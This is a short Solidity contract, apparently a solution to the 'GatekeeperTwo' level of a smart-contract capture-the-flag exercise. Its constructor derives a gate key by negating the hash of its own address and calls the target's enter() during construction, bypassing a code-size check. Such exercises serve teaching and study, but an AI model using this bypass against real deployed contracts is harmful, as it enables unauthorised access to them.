// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(address target) public {
        bytes8 gateKey = ~bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
        );
        GatekeeperTwo(target).enter(gateKey);
    }
}
